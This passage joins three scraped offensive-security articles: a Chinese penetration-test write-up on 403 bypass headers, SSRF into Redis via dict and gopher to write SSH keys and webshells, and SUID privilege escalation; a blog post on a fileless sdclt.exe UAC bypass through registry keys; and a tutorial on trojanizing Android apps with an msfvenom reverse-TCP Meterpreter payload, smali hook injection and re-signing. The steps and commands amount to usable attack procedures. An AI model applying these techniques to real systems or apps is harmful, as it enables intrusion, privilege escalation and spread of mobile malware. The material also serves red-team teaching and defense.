\u00e0403\n*\n*\n*\n*\n*\n*\n*\n*\n*\nHost: test.com\n\u7ed5\u8fc7\uff1a\nGET \/xxx HTTP\/1.1 \u00e0200\nHost: test.com\nX-Original-URL: \/xxx\n2. GET \/xxx HTTP\/1.1 \u00e0403\n*\n*\n*\n*\n*\n*\n*\n*\n*\nHost: test.com\n\u7ed5\u8fc7\uff1a\nGET \/xxx HTTP\/1.1 \u00e0200\nHost: test.com\nReferer: http:\/\/test.com\/xxx\n3. 302\u8df3\u8f6c\uff1a\u62e6\u622a\u5e76drop\u8df3\u8f6c\u7684\u6570\u636e\u5305\uff0c\u4f7f\u5176\u505c\u7559\u5728\u5f53\u524d\u9875\u9762\u3002\n4. \u524d\u7aef\u9a8c\u8bc1\uff1a\u53ea\u9700\u8981\u5220\u6389\u5bf9\u5e94\u7684\u906e\u6321\u6a21\u5757\uff0c\u6216\u8005\u662f\u9a8c\u8bc1\u6a21\u5757\u7684\u524d\u7aef\u4ee3\u7801\u3002\n\u8fd9\u91cc\u4f7f\u7528burp\u62e6\u622a\u4e00\u4e0b\uff0c\u6254\u6389\u540e\u9762\u7684\u8df3\u8f6c\uff0c\u770b\u5230\u5982\u4e0b\u754c\u9762\uff0c\u5f39\u7a97\u8fd8\u662f\u63d0\u793a\u6ca1\u6cd5\u8bbf\u95ee\uff0c\u6743\u9650\u4e0d\u591f\uff0c\u4f46\u662f\u548c\u4e4b\u524d\u7684\u8bbf\u95ee403\u4e0d\u4e00\u6837\u4e86\uff0c\u96be\u9053\u662f\u6211\u4f7f\u7528\u4e86\u666e\u901a\u7528\u6237\n\u767b\u5f55\u7684\u7f18\u6545\uff1f\uff1f\uff1f\n[]\n\u719f\u7ec3\u7684\u6253\u5f00F12\u5f00\u53d1\u8005\u6a21\u5f0f\u3002\u5220\u6389\u524d\u7aef\u4ee3\u7801\u770b\u662f\u5426\u80fd\u4f7f\u7528\u4ed6\u7684\u529f\u80fd\u3002\n[]\n\u5220\u5b8c\u6743\u9650\u9a8c\u8bc1\u6a21\u5757\u7684\u524d\u7aef\u4ee3\u7801\u540e\uff0c\u8fd0\u6c14\u4e0d\u9519\uff0c\u8fd8\u6709\u90e8\u5206\u529f\u80fd\u53ef\u4ee5\u4f7f\u7528\u3002\nssrf-\u901a\u5411shell\u7684\u94a5\u5319\n\u5728\u5ba2\u6237\u7cfb\u7edf\u540e\u53f0\u8f6c\u4e86\u534a\u5929\uff0c\u6700\u540e\u5728\u4e00\u4e2a\u67e5\u770b\u529f\u80fd\u5904\u53d1\u73b0\u4e86\u7a81\u7834\u70b9\n[]\n\u6293\u5305\u53d1\u73b0post\u53c2\u6570\u597d\u50cf\u6709\u70b9\u610f\u601d\uff0c\u5c1d\u8bd5\u6362\u6389\u9ed8\u8ba4\u56fe\u7247\u7684\u5730\u5740\uff0c\u6539\u4e3adnslog\u5730\u5740\uff0c\u8fd4\u56de\u63d0\u793a\u8def\u5f84\u4e0d\u6b63\u786e\u3002\n[]\n\u731c\u6d4b\u662f\u505a\u4e86\u540e\u7f00\u7684\u9650\u5236\uff0c\u5e94\u8be5\u53ea\u80fdpost png,jpg\u7b49\u540e\u7f00\u7684\u5730\u5740\uff0c\u5148\u8bd5\u8bd5\u8bfb\u53d6\u4e00\u4e0b\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u7684\u56fe\u7247\uff0c\u6210\u529f\u8fd4\u56de\uff0c\u679c\u7136\u6709\u4e1c\u897f\u3002\n[]\n\u4e00\u4e2a\u6807\u51c6\u7684ssrf\uff0c\uff0c\u56e0\u4e3a\u6ca1\u6cd5\u6539\u53d8\u540e\u7f00\uff0c\u5e94\u8be5\u662f\u4e0d\u80fd\u8bfb\u53d6passwd\u4e4b\u7c7b\u7684\u6587\u4ef6\u4e86\uff0c\u8fd8\u662f\u5148\u6253\u4e00\u6ce2dnslog\uff0c\u8bb0\u5f55\u4e00\u4e0b\u771f\u5b9eip\u5730\u5740\u3002\n[]\n\u4f46\u662fssrf\u53ef\u4e0d\u53ea\u662f\u8bfb\u4e2a\u6587\u4ef6\u90a3\u4e48\u7b80\u5355\uff0cssrf\u901a\u5e38\u53ef\u4ee5\u7528\u6765\u6253\u5185\u7f51\u5e94\u7528\uff0c\u901a\u8fc7\u5b83\u6765\u6253\u4e2aredis\u6216\u8005mysql\u5c82\u4e0d\u7f8e\u54c9\u3002\n[]\n\u5148\u501f\u52a9ssrf\u63a2\u6d4b\u4e00\u4e0b\u5f00\u653e\u7684\u7aef\u53e3\uff0c22\uff0c80\uff0c443\uff0c6379\u3002\n[]\n\u770b\u770b\u653b\u51fbredis\u4e00\u822c\u53ef\u4ee5\u5229\u7528\u7684dict\u548cgopher\u4e24\u79cd\u534f\u8bae\uff0c\u4f7f\u7528gopher\u534f\u8bae\u7684\u8bdd\u9700\u8981\u6ce8\u610f\u4e00\u4e9b\u5229\u7528\u9650\u5236\u3002\n[]\ngopher\u534f\u8bae\u89c4\u5219\u6bd4\u8f83\u590d\u6742\uff0c\u7ecf\u8fc7\u67e5\u627e\uff0c\u627e\u5230\u4e86\u4e00\u6b3e\u5de5\u5177\uff0c\u4f7f\u7528\u5176\u751f\u6210\u7684payload\u5f88\u51c6\u786e\uff0c\u4e14\u53ef\u81ea\u5b9a\u4e49\u3002\n\u9700\u8981\u7684\u5c0f\u4f19\u4f34\u53ef\u4ee5\u81ea\u53d6\u3002\nhttps:\/\/github.com\/firebroo\/sec_tools\n\u9700\u8981\u5c06\u5185\u5bb9\u518d\u8fdb\u884c\u4e00\u6b21url\u7f16\u7801\u4f20\u5230web\u7684\u53c2\u6570\u4e2d\u624d\u4f1a\u6b63\u5e38\u8fd0\u884c\u3002\nDict\u534f\u8bae\u6572\u547d\u4ee4\u8f83\u4e3a\u76f4\u63a5\u3002\n1.\u5199\u5165\u5185\u5bb9\uff1b\ndict:\/\/127.0.0.1:6379\/set\u274ctest\n2.\u8bbe\u7f6e\u4fdd\u5b58\u8def\u5f84\uff1b\ndict:\/\/127.0.0.1:6379\/config:set:dir:\/tmp\/\n3.\u8bbe\u7f6e\u4fdd\u5b58\u6587\u4ef6\u540d\uff1b\ndict:\/\/127.0.0.1:6379\/config:set:dbfilename:1.png\n4.\u4fdd\u5b58\u3002\ndict:\/\/127.0.0.1:6379\/save\n\u6211\u4eec\u4e00\u822c\u5bf9redis\u5e38\u89c1\u7684\u653b\u51fb\u65b9\u5f0f\u6709\uff1a\n1. \u5199webshell\uff1b\n2. \u5199\u5bc6\u94a5\uff1b\n3. \u5b9a\u65f6\u4efb\u52a1\u53cd\u5f39\u3002\n\u7b2c\u4e00\u79cd\u9700\u8981web\u8def\u5f84\uff0c\u540e\u4e24\u79cd\u65b9\u6cd5\u53ef\u80fd\u9700\u8981\u4e00\u5b9a\u7684\u6743\u9650\u3002\n\u653b\u51fb\u7684\u601d\u8def\u6709\u4e86\uff0c\u4f46\u662f\u6211\u4eec\u901a\u8fc7dict\u534f\u8bae\u8bbf\u95ee\u540e\u5e76\u6ca1\u6709\u51fa\u73b0\u56de\u663e\uff0c\u4e0d\u77e5\u9053\u662f\u5426\u5b58\u5728\u672a\u6388\u6743\u7684redis\u670d\u52a1\uff0c\u76f2\u6253\u4e00\u987f\u53ef\u80fd\u6d6a\u8d39\u5b9d\u8d35\u7684\u65f6\u95f4\uff0c\u7075\u5149\u4e4d\u73b0\uff0c\u53ef\u4ee5\n\u5148\u5199\u4e00\u4e2a\u56fe\u7247\u6587\u4ef6\u5230tmp\u76ee\u5f55\u91cc\uff0c\u518d\u901a\u8fc7file\u534f\u8bae\u8fdb\u884c\u8bfb\u53d6\uff0c\u51fa\u73b0\u5185\u5bb9\u5c31\u8868\u660eredis\u662f\u80fd\u591f\u5229\u7528\u7684\u3002\n\u51fa\u73b0\u56de\u663e\uff0c\u8bf4\u660e\u6587\u4ef6\u6210\u529f\u5199\u5165\u4e86\uff0c\u867d\u7136\u6709\u4e71\u7801\uff0c\u4f46\u662f\u5f71\u54cd\u4e0d\u5927\u3002\n[]\n\u4e3a\u4e86\u62ff\u5230shell\uff0c\u5f53\u7136\u662f\u5148\u8bd5\u8bd5\u7528gopher\u534f\u8bae\u5199\u5bc6\u94a5\uff0c\u672c\u673a\u751f\u6210\u5bc6\u94a5:ssh-keygen -t\nrsa\u3002\u518d\u4f7f\u7528\u5de5\u5177\u5c06\u4ee5\u4e0b\u547d\u4ee4\u8f6c\u6362\u6210gopher\u534f\u8bae\u652f\u6301\u7684\u5f62\u5f0f\u3002\n*\n*\n*\n*\n*\n*\n*\nconfig set dir \/root\/.ssh\nconfig set dbfilename authorized_keys\nset test \"xxx\"\nsave\n[]\n\u5199\u5165\u540e\u5c1d\u8bd5\u8fde\u63a5\u4e00\u4e0b\u9875\u9762\u5565\u4e5f\u6ca1\u8fd4\u56de\uff0c\u5c1d\u8bd5\u8fde\u63a5\u4e00\u4e0bWfk\uff0c\u7a81\u7136\u60f3\u8d77nmap\u7ed3\u679c\u597d\u50cfssh\u6ca1\u5bf9\u5916\u5f00\u653e\uff0c\u51b3\u7b56\u6027\u5931\u8bef\u3002\n[]\n\u5c1d\u8bd5\u53cd\u5f39\u8ba1\u5212\u4efb\u52a1\uff0c\u4f46\u662f\u7b49\u4e86\u534a\u5929\u4e5f\u6ca1\u89c1shell\u5f39\u56de\u6765\uff0c\u731c\u6d4b\u53ef\u80fd\u662f\u6743\u9650\u4e0d\u591f\uff0c\u6ca1\u80fd\u591f\u6210\u529f\u5199\u5165\uff0c\u53ef\u60dc\u524d\u671f\u6d4b\u8bd5\u4e2d\u5e76\u6ca1\u6709\u53d1\u73b0\u4fe1\u606f\u6cc4\u9732\u66b4\u9732\u51faweb\u76ee\u5f55\u7684\u8def\n\u5f84\uff0c\u4e0d\u7136\u80fd\u5199\u4e2awebshell\u4e5f\u662f\u6781\u597d\u7684\u3002\n\u6ca1\u529e\u6cd5\uff0c\u8fd9\u4e2a\u53ea\u80fd\u5148\u6401\u7f6e\u4e00\u8fb9\uff0c\u6761\u6761\u5927\u8def\u540c\u7f57\u9a6c\uff0c\u65e2\u7136\u8fd9\u4e2a\u57df\u540d\u4e0d\u884c\uff0c\u770b\u770b\u6709\u6ca1\u6709\u7ed1\u5b9a\u7684\u5176\u4ed6\u57df\u540d\u5728\u8fd9\u4e2aip\u4e0a\u3002\n\u65c1\u7ad9\u4fe1\u606f\u6cc4\u9732getshell\n\u901a\u8fc7\u4e4b\u524d\u8bb0\u5f55\u7684dnslog\u4e0a\u7684ip\u5730\u5740\u8fdb\u884c\u53cd\u67e5\uff0c\u53d1\u73b0\u4e86\u8be5ip\u5730\u5740\u4e0b\u7ed1\u5b9a\u4e86\u5176\u4ed6\u57df\u540d\u3002\n[]\n\u8bbf\u95ee\u540e\u6539\u6389url\u53d8\u91cf\u540e\u7684\u9ed8\u8ba4\u53c2\u6570\uff0c\u89e6\u53d1\u62a5\u9519\uff0c\u6210\u529f\u7206\u51fa\u4e86\u7edd\u5bf9\u8def\u5f84\uff0c\u5c0f\u5c0f\u7684\u62a5\u9519\uff0c\u5374\u63d0\u4f9b\u4e86\u5de8\u5927\u7684\u4ef7\u503c\u3002\n[]\n\u56e0\u4e3a\u662f\u65c1\u7ad9\uff0c\u73b0\u5728\u83b7\u53d6\u5230\u4e86B\u7ad9\u7684\u7f51\u7ad9\u8def\u5f84\uff0c\u5982\u679c\u80fd\u901a\u8fc7A\u7ad9\u7684ssrf\u628awebshell\u5199\u5230B\u7ad9\u7684web\u8def\u5f84\u91cc\u4e5f\u662f\u7f8e\u6ecb\u6ecb\u4e86\uff0c\u8bf4\u5e72\u5c31\u5e72\u3002\n[]\n[]\n\u8bbf\u95eeshell\uff0c\u5e76\u6572\u5165whoami\u547d\u4ee4\u67e5\u770b\u6743\u9650\uff0c\u53d1\u73b0\u662f\u4e2a\u4f4e\u6743www\u7528\u6237\u3002\n[]\n\u63d0\u6743\n\u5f39\u4e2a\u4ea4\u4e92\u7684shell\u51fa\u6765\u65b9\u4fbf\u8fdb\u884c\u63d0\u6743\uff0c\u4f46\u662f\u8fdc\u7a0b\u670d\u52a1\u5668\u4e00\u76f4\u6ca1\u6cd5\u6b63\u5e38\u6536\u5230shell\u3002\n\u5207\u6362\u4e00\u4e0b\u7aef\u53e3\uff0c\u7f51\u7edc\u7ba1\u7406\u5458\u53ef\u80fd\u505a\u4e86\u4e00\u5b9a\u7684\u9650\u5236\uff0c\u5c1d\u8bd5\u901a\u8fc7443\uff0c53\u7b49\u7ecf\u5e38\u5f00\u653e\u7684\u7aef\u53e3\u5f39\u51fashell\u3002\n[]\n\u6210\u529f\u62ff\u5230shell\uff0c\u83b7\u53d6\u5230\u4f4e\u6743\u9650SHELL\u540e\u4e00\u822c\u4f1a\u770b\u770b\u5185\u6838\u7248\u672c\uff0c\u68c0\u6d4b\u5f53\u524d\u7528\u6237\u6743\u9650\uff0c\u518d\u5217\u4e3eSuid\u6587\u4ef6\uff0c\u5982\u679c\u90fd\u6ca1\u53d1\u73b0\u53ef\u80fd\u4f1a\u501f\u52a9\u4e00\u4e9b\u81ea\u52a8\u5316\u811a\u672c\u6765\u68c0\n\u67e5\u53ef\u80fd\u5b58\u5728\u7684\u63d0\u6743\u65b9\u5f0f\u3002\n[]\n\u901a\u8fc7find \/ -perm -u=s -type f 2>\/dev\/null\u770b\u770b\u6709s\u5c5e\u6027\u6587\u4ef6\u3002\n[]\nPython\u597d\u50cf\u662f\u53ef\u4ee5\u901a\u8fc7suid\u63d0\u6743\u7684\uff0c\u7ffb\u4e86\u7ffb\u81ea\u5df1\u7684\u5c0f\u7b14\u8bb0\uff0cpayload\u4e00\u53d1\u5165\u9b42\u3002\n[]\n\u8fd9\u91cc\u9644\u4e0acentos\u4e0bsuid\u63d0\u6743\u8f83\u4e3a\u5168\u9762\u7684\u603b\u7ed3\uff1a\nhttps:\/\/www.freebuf.com\/articles\/system\/244627.html\n\u81f3\u6b64\u6d4b\u8bd5\u7ed3\u675f\u3002\n[]\n\u603b\u7ed3\n\u6574\u4e2a\u6d4b\u8bd5\u8fc7\u7a0b\u9047\u5230\u5f88\u591a\u56f0\u96be\uff0c\u8bb8\u591a\u5730\u65b9\u770b\u4f3c\u7b80\u5355\uff0c\u5176\u5b9e\u662f\u53cd\u590d\u5c1d\u8bd5\u4e4b\u540e\u624d\u987a\u5229\u8fc7\u5173\u3002\n\u6d4b\u8bd5\u4e2d\u5176\u5b9e\u5e76\u672a\u4f7f\u7528\u591a\u4e48\u725b\u903c\u7684\u653b\u51fb\u624b\u6bb5\uff0c\u7b80\u5355\u68b3\u7406\u6574\u4e2a\u6d41\u7a0b\uff1a\u5168\u7f51\u4fe1\u606f\u641c\u96c6\u53d1\u73b0\u7528\u6237\u8d26\u6237\u00e0\u649e\u5e93\u62ff\u5230\u90e8\u5206\u5bc6\u7801\u00e0\u524d\u7aef\u9a8c\u8bc1\u7ed5\u8fc7\u53d1\u73b0\u65b0\u529f\u80fd\u70b9\u00e0ssrf\u63a2\u6d4b\u4fe1\u606f\n\u00e0\u65c1\u7ad9\u83b7\u53d6web\u7edd\u5bf9\u8def\u5f84\u8de8\u7f51\u7ad9\u5199\u5165shell\u00e0\u62ff\u5230shell\u540e\u901a\u8fc7suid\u63d0\u6743\u3002\n[]\n[]\n\u9884\u89c8\u65f6\u6807\u7b7e\u4e0d\u53ef\u70b9\n[javascript]\nScan to Follow\n\u7ee7\u7eed\u6ed1\u52a8\u770b\u4e0b\u4e00\u4e2a\n(BUTTON) \u8f7b\u89e6\u9605\u8bfb\u539f\u6587\n\u9152\u4ed9\u6865\u516d\u53f7\u90e8\u961f\n[2]Got It\n[javascript] Scan with Weixin to\nuse this Mini Program\n[3]Cancel [4]Allow\n[5]Cancel [6]Allow\n: \uff0c .   Video Mini Program Like \uff0c\u8f7b\u70b9\u4e24\u4e0b\u53d6\u6d88\u8d5e Wow \uff0c\u8f7b\u70b9\u4e24\u4e0b\u53d6\u6d88\u5728\u770b Share Comment"}
{"text":"#[1]Medium [2]alternate\n[3]Open in app\n[4]Sign up\n[5]Sign in\n____________________\nWrite\n[6]Sign up\n[7]Sign in\n(BUTTON)\n\u201cFileless\u201d UAC Bypass using sdclt.exe\nMatt Nelson\nPosts By SpecterOps Team Members\n[8]Matt Nelson\n\u00b7\n[9]Follow\nPublished in\n[10]\nPosts By SpecterOps Team Members\n\u00b7\n4 min read\n\u00b7\nMar 17, 2017\n--\n(BUTTON)\n[11](BUTTON)\n(BUTTON)\nListen\n(BUTTON)\nShare\nRecently, I published a post on using [12]App Paths with sdclt.exe to\nbypass UAC. You may remember that the App Path bypass required a file\non disk. Since sdclt.exe is out there, I figured I would publish\nanother bypass using that binary, only this one is fileless. I\nmentioned it in my [13]previous post, but the [14]Vault7 leak confirms\nthat bypassing UAC is operationally interesting, even to nation states,\nas several UAC bypasses\/notes were detailed in the dump. As far as\npublic bypasses go, definitely check out the [15]UACME project by\n[16]@hfiref0x, which has a nice collection of public techniques.\nIn newer versions of Windows, Microsoft has shown that they are taking\nthe [17]bypasses seriously. This has motivated me to spend a little\nmore time on UAC and the different methods around it.\nAs some of you may know, there are some Microsoft signed binaries that\nauto-elevate due to their manifest. You can read more about these\nbinaries and their manifests [18]here. While searching for more of\nthese auto-elevating binaries by using the SysInternals tool\n\u201c[19]sigcheck\u201c, I came across \u201csdclt.exe\u201d and verified that it\nauto-elevates due to its manifest:\n*Note: This only works on Windows 10. The manifest for sdclt.exe in\nWindows 7 has the requestedExecutionLevel set to \u201cAsInvoker\u201d,\npreventing auto-elevation when started from medium integrity.\nAs I mentioned in my [20]last post, a common technique used to\ninvestigate loading behavior on Windows is to use [21]SysInternals\nProcess Monitor to analyze how a process behaves when executed. I often\nwork some basic binary analysis into my investigative process in order\nto see what other opportunities exist.\nOne of the first things I tend to do when analyzing an auto-elevate\nbinary is to look for any potential command line arguments. I use IDA\nfor this, but you can use your preferred tool. When peering into\nsdclt.exe, I noticed a few arguments that stood out due to interesting\nkeywords:\nThese were interesting as sdclt.exe is set to auto-elevate in its\nmanifest anyway. Looking at sdclt.exe in IDA, it checks if the argument\nmatches \u201c\/kickoffelev\u201d. If it does, it sets the full path for\n\u201csdclt.exe\u201d, adds \u201c\/KickOffJob\u201d as a parameter and then calls\nSxShellExecuteWithElevate.\nFollowing that path, SxShellExecuteWithElevate starts\n\u201c%systemroot%\\system32\\sdclt.exe \/kickoffjob\u201d with the \u201cRunas\u201d\n[22]verb. This is essentially programmatically executing the\n\u201cRunAsAdministrator\u201d option when you right-click a binary.\nThe next step is to run \u201csdclt.exe \/Kickoffelev\u201d with procmon running.\nAfter going through the output, we see the trusty\n\u201cshell\\<verb>\\command\u201d registry search path in the HKEY_CURRENT_USER\nhive.\nThe next step was to add those keys and see if our binary and\nparameters of choice would execute. Unfortunately, nothing executed\nafter adding the keys and starting \u201csdclt.exe \/kickoffelev\u201d. Looking\nback in procmon, our keys are queried, but sdclt.exe is actually\nlooking for an additional value within the \u201ccommand\u201d key:\n\u201cIsolatedCommand\u201d.\nWe can then add our payload and parameters in a string (REG_SZ) value\nwithin the \u201cCommand\u201d key called \u201cIsolatedCommand\u201d:\nThis is the same bug (minus the IsolatedCommand portion) that was used\nin the eventvwr.exe \u201cfileless\u201d UAC bypass. You can read about the\neventvwr.exe bypass and the specific registry keys used [23]here.\nNotice that instead of \u201cshell\\open\\command\u201d, we now see\n\u201cshell\\runas\\command\u201d. This is because sdclt.exe was invoked (again)\nusing the \u201cRunAs\u201d verb via SxShellExecuteWithElevate.\nAfter adding our payload as the \u201cIsolatedCommand\u201d value, running\n\u201csdclt.exe \/KickOffElev\u201d will execute our payload (and any parameters)\nin a high-integrity context:\nTo demonstrate this technique, you can find a script here:\n[24]https:\/\/github.com\/enigma0x3\/Misc-PowerShell-Stuff\/blob\/master\/Invo\nke-SDCLTBypass.ps1\nThe script takes a full path to your payload and any parameters.\n\u201cC:\\Windows\\System32\\cmd.exe \/c notepad.exe\u201d is a good one to validate.\nIt will automatically add the keys, start \u201csdclt.exe \/kickoffelev\u201d and\nthen cleanup.\nThis particular technique can be remediated or fixed by setting the UAC\nlevel to \u201cAlways Notify\u201d or by removing the current user from the Local\nAdministrators group. Further, if you would like to monitor for this\nattack, you could utilize methods\/signatures to look for and alert on\nnew registry entries in\nHKCU:\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand\nCheers,\nMatt\nOriginally published at [25]enigma0x3.net on March 17, 2017.\nUac\nRed Team\n--\n--\n(BUTTON)\n[26](BUTTON)\n(BUTTON)\nMatt Nelson\nPosts By SpecterOps Team Members\n[27]Follow\n[28](BUTTON)\n[29]\nWritten by Matt Nelson\n[30]1.5K Followers\n\u00b7Editor for\n[31]\nPosts By SpecterOps Team Members\nRed Teamer | Security Researcher | Enjoys abusing features | Tweets are\nmy own | [32]http:\/\/github.com\/enigma0x3\n[33]Follow\n[34](BUTTON)\n[35]\nHelp\n[36]\nStatus\n[37]\nAbout\n[38]\nCareers\n[39]\nBlog\n[40]\nPrivacy\n[41]\nTerms\n[42]\nText to speech\n[43]\nTeams"}
{"text":"#[1]Penetration Testing Lab \u00bb Feed [2]Penetration Testing Lab \u00bb\nComments Feed [3]Penetration Testing Lab \u00bb Injecting Metasploit\nPayloads into Android Applications \u2013 Manually Comments Feed\n[4]alternate [5]alternate [6]Penetration Testing Lab [7]WordPress.com\n[8]Skip to content\n[9]Penetration Testing Lab\nOffensive Techniques & Methodologies\n(BUTTON) Menu\n* [10]Methodologies\n+ [11]Red Teaming\no [12]Persistence\n* [13]Resources\n+ [14]Papers\no [15]Web Application\n+ [16]Presentations\no [17]Defcon\no [18]DerbyCon\no [19]Tools\n+ [20]Videos\no [21]BSides\no [22]Defcon\no [23]DerbyCon\no [24]Hack In Paris\n* [25]Contact\n+ [26]About Us\nPosted on [27]June 26, 2017June 25, 2017\nInjecting Metasploit Payloads into Android Applications \u2013 Manually\nby [28]Administrator.In [29]Mobile Pentesting.[30]6 Comments on\nInjecting Metasploit Payloads into Android Applications \u2013 Manually\nThe majority of the Android applications are lacking sufficient\nprotections around the binary and therefore an attacker can easily\ntrojanized a legitimate application with a malicious payloads. This is\none of the reasons that mobile malware is spreading so rapidly in the\nAndroid phones.\nIn mobile security assessments attempts to trojanized the application\nunder the scope can be useful as a proof of concept to demonstrate to\nthe customer the business impact in terms of reputation if their\napplication can be used for malicious purposes.\nThe process of injecting Metasploit payloads into android applications\nthrough the use of scripts has been already described in a previous\n[31]post. This article will describe how the same output can be\nachieved manually.\nStep 1 \u2013 Payload Generation\nMetasploit MsfVenom can generate various forms of payloads and it could\nbe used to produce an APK file which it will contain a Meterpreter\npayload.\nmsfvenom -p android\/meterpreter\/reverse_tcp LHOST=192.168.1.169\nLPORT=4444 R > pentestlab.apk\nNo platform was selected, choosing Msf::Module::Platform::Android from the paylo\nad\nNo Arch selected, selecting Arch: dalvik from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 8839 bytes\nGenerate APK - Meterpreter Payload Generate APK Payload via Metasploit\nStep 2 \u2013 Decompile the APK\nBefore anything else the target application and the pentestlab.apk that\nit has been generated previously must be decompiled. This can be\nachieved with the use of [32]apktool. The following command will\ndecompile the code and save it into .smali files\njava -jar apktool.jar d -f -o payload \/root\/Downloads\/pentestlab.apk\nI: Using Apktool 2.2.2 on pentestlab.apk\nI: Loading resource table...\nI: Decoding AndroidManifest.xml with resources...\nI: Loading resource table from file: \/root\/.local\/share\/apktool\/framework\/1.apk\nI: Regular manifest package...\nI: Decoding file-resources...\nI: Decoding values *\/* XMLs...\nI: Baksmaling classes.dex...\nI: Copying assets and libs...\nI: Copying unknown files...\nI: Copying original files...\nDecompiling APKs Decompiling APKs\nStep 3 \u2013 Transfer the Payload Files\nThe payload files from the pentestlab.apk needs to be copied inside the\nsmali folder where all the code of application is located. Specifically\nthe two folders are:\n\/root\/Downloads\/payload\/smali\/com\/metasploit\/stage\n\/root\/Downloads\/original\/smali\/com\/metasploit\/stage\nStep 4 \u2013 Injecting the Hook\nExamining the Android manifest file of the application can help to\ndetermine which is the Main Activity that is launched when the\napplication is opened. This is needed because the payload will not\nexecuted otherwise.\nIdentification of Main Activity Identification of Main Activity\nThe following line which is inside in the Main Activity file needs must\nbe replaced with the code below:\n;->onCreate(Landroid\/os\/Bundle;)V\nIdentification of code to be replaced Identification of code to be\nreplaced\nThe following line will just launch the metasploit payload alongside\nwith the existing code when the activity starts.\ninvoke-static {p0}, Lcom\/metasploit\/stage\/Payload;->start(Landroid\/content\/Conte\nxt;)V\nInjecting the hook Injecting the Hook\nStep 5 \u2013 Injecting the Application with Permissions\nIn order to make the injected payload more effective additional\npermissions can be added to the android manifest file of the\napplication that will give more control over the phone if the user\naccepts them.\nInjecting the APK with Excessive Permissions Adding Android Permissions\nStep 6 \u2013 Recompile the Application\nNow that both the payload and permissions have been added the\napplication is ready to be compiled again as an APK file.\njava -jar apktool.jar b \/root\/Downloads\/original\/\nBuilding the Injected APK Building the Injected APK\nStep 7 \u2013 Signing the APK\nApplications cannot installed on the device if they are not signed. The\ndefault android debug key can be used:\njarsigner -verbose -keystore ~\/.android\/debug.keystore -storepass android -keypa\nss android -digestalg SHA1 -sigalg MD5withRSA \/root\/Downloads\/original\/dist\/targ\net.apk androiddebugkey\nSigning the APK Signing the APK\nFrom the moment that the application will installed and run on the\ndevice a meterpreter session will open.\nMeterpreter via Injected Android APK Meterpreter via Injected Android\nAPK\nRate this:\nShare this:\n* [33]Twitter\n* [34]Facebook\n* [35]LinkedIn\n* [36]Reddit\n* [37]Tumblr\n* [38]WhatsApp\n* [39]Telegram\n* [40]Pinterest\n* [41]Pocket\n* [42]Email\n*\nLike Loading...\nRelated\n[43]Android[44]Metasploit[45]Mobile[46]Mobile\nPentesting[47]Payloads[48]Pentesting\n6 Comments\n1.\nVesa says:\n[49]September 20, 2017 at 8:26 pm\nPlease help me. I can not understand with what is in the above post\n.. please tell me its the way. With a video tutorial about posting\nabove.\n[50]Reply\n1.\n[51]netbiosX says:\n[52]September 20, 2017 at 8:39 pm\nIn order to understand it you have to do it by yourself. Don\u2019t\nfollow the steps blindly. Unfortunately there is no time to\ncreate a video tutorial. It is straight forward what you need\nto do in this post.\n[53]Reply\n2.\nEdd says:\n[54]October 28, 2017 at 12:06 pm\nCan you please explain how to backdoor\nandroid\/meterpreter_reverse_https this payload???? because on\ndecompilation i found there are more smali files then\nandroid\/meterpreter\/reverse_https this payload.\nPlease make a new post for backdooring\nandroid\/meterpreter_reverse_https payload.\nThank You\n[55]Reply\n3.\nBeka says:\n[56]April 26, 2018 at 11:30 am\nhello, i don\u2019t understand the jarsigner command and when i executed\nit says this error: arsigner error: java.lang.RuntimeException:\nkeystore load: \/root\/.android\/debug.keystore (No such file or\ndirectory) so plz explain me what can i do.\nthx and sorry for my bad english\n[57]Reply\n4.\n[58]Daron wolff says:\n[59]December 10, 2018 at 4:37 pm\nThanks a lot!\n[60]Reply\n5.\nWolfer says:\n[61]August 5, 2020 at 5:01 pm\nThanks a lot\n[62]Reply\nLeave a Reply [63]Cancel reply\n\u0394\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\nPost navigation\n[64]Previous Previous post: AppLocker Bypass \u2013 MSIEXEC\n[65]Next Next post: AppLocker Bypass \u2013 MSXSL\nFollow PenTest Lab\nEnter your email address to follow this blog and receive notifications\nof new articles by email.\nEmail Address: ____________________\n(BUTTON) Follow\nJoin 2,591 other subscribers\nSearch Topic\n____________________ (BUTTON) Search\nRecent Posts\n* [66]Persistence \u2013 Event Log\n* [67]Initial Access \u2013 search-ms URI Handler\n* [68]Persistence \u2013 Scheduled Task Tampering\n* [69]Persistence \u2013 Windows Telemetry\n* [70]Persistence \u2013 Service Control Manager\nCategories\n* [71]Coding (10)\n* [72]Exploitation Techniques (19)\n* [73]External Submissions (3)\n* [74]General Lab Notes (22)\n* [75]Information Gathering (12)\n* [76]Infrastructure (2)\n* [77]Maintaining Access (4)\n* [78]Mobile Pentesting (7)\n* [79]Network Mapping (1)\n* [80]Post Exploitation (13)\n* [81]Red Team (123)\n+ [82]Credential Access (3)\n+ [83]Defense Evasion (22)\n+ [84]Domain Escalation (5)\n+ [85]Domain Persistence (4)\n+ [86]Initial Access (1)\n+ [87]Lateral Movement (2)\n+ [88]Man-in-the-middle (1)\n+ [89]Persistence (34)\n+ [90]Privilege Escalation (17)\n* [91]Reviews (1)\n* [92]Social Engineering (11)\n* [93]Tools (7)\n* [94]VoIP (4)\n* [95]Web Application (14)\n* [96]Wireless (2)\nPentest Laboratories Discord\n* [97]Discord\nPen Test Lab Stats\n* 7,183,938 hits\n[98]Facebook Page\n[99]Facebook Page\n__________________________________________________________________\n[100]Blog at WordPress.com.\n* [101]Methodologies\n+ [102]Red Teaming\no [103]Persistence\n* [104]Resources\n+ [105]Papers\no [106]Web Application\n+ [107]Presentations\no [108]Defcon\no [109]DerbyCon\no [110]Tools\n+ [111]Videos\no [112]BSides\no [113]Defcon\no [114]DerbyCon\no [115]Hack In Paris\n* [116]Contact\n+ [117]About Us\n* [118]Comment\n* [119]Reblog\n* [120]Subscribe [121]Subscribed\n+ [122]Penetration Testing Lab\nJoin 2,289 other subscribers\n____________________\n(Sign me up) Sign me up\n+ Already have a WordPress.com account? [123]Log in now.\n*\n+ [124]Penetration Testing Lab\n+ [125]Customize\n+ [126]Subscribe [127]Subscribed\n+ [128]Sign up\n+ [129]Log in\n+ [130]Copy shortlink\n+ [131]Report this content\n+ [132]View post in Reader\n+ [133]Manage subscriptions\n+ [134]Collapse this bar\nLoading Comments...\nWrite a 